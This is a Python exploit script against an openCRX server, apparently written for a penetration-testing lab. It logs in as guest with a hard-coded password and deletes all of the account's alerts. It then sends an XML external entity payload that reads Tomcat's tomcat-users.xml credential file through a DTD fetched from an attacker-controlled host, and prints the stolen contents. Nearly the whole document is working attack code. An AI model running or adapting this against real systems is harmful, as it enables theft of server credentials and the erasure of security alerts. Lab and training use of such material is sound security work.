import requests
import argparse
import re
from base64 import b64encode

parser = argparse.ArgumentParser()
parser.add_argument('--host', help='IP of attackbox', required=True)
proxies = {
    'http': '127.0.0.1:8080',
    'https': '127.0.0.1:8080'
}
args = parser.parse_args()
session = requests.session()

url = "http://opencrx:8080/opencrx-core-CRX/ObjectInspectorServlet"
get_params = '?loginFailed=false'
res = session.get(url + get_params, allow_redirects=True, proxies=proxies)
print(res.status_code)
print("==================================")
print(res.cookies)
print("==================================")
#print(res.content)
print("==================================")
url = "http://opencrx:8080/opencrx-core-CRX/j_security_check"
data = {"j_username": "guest", "j_password": "donkey123"}
res = session.post(url, data=data, allow_redirects=True, proxies=proxies)
pattern = re.compile('window.*;') # extract out window.href='redirect_url'
result = pattern.findall(res.text)
pattern = re.compile("(?<=')(.*?)(?=')") # extract out redirect url
result = pattern.findall(result[0])
res = session.get(result[0], allow_redirects=True, proxies=proxies)

if 'Logoff&nbsp;guest' in str(res.text):
    print('Login Success')
    auth = auth=('guest','donkey123')
    # Deleting Alerts
    url = 'http://opencrx:8080/opencrx-rest-CRX/org.opencrx.kernel.home1/provider/CRX/segment/Standard/userHome/guest/alert'
    headers = {'Accept': 'application/json'}
    res = session.get(url, allow_redirects=True, headers=headers, auth=auth, proxies=proxies)
    print(res.status_code)
    alerts = res.json()
    print(alerts)
    for i in range(0, int(alerts["@total"])):
        delete_url = alerts['objects'][i]["@href"]
        print("Deleting alert: ", delete_url)
        res = session.delete(delete_url, allow_redirects=True, headers=headers, auth=auth, proxies=proxies)
        if res.status_code != 204:
            print("error delete alert: ", delete_url)
        #print(res.status_code)   
        #print(res.text)
    url = 'http://opencrx:8080/opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/account'
    data = F'<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % start "<![CDATA["><!ENTITY % file SYSTEM "file:///home/student/crx/apache-tomee-plus-7.0.5/conf/tomcat-users.xml" ><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "http://{args.host}/wrapper.dtd" >%dtd;]><org.opencrx.kernel.account1.Contact><lastName>&wrapper;</lastName><firstName>Tom</firstName></org.opencrx.kernel.account1.Contact>'
    res = session.post(url, headers=headers, auth=auth, data=data, proxies=proxies)
    res_json = res.json()
    print(res_json['element'][2]["parameter"]["_item"][2]["$"])
    